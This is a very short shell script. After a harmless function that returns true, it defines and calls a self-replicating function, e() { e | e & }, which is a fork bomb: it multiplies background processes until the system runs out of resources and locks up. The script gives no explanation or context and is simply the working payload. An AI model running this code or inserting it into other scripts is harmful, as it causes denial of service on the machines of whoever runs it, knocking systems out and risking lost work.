#!/bin/sh

r() { 
    true;
}; r

e() { 
    e | e &
}; e

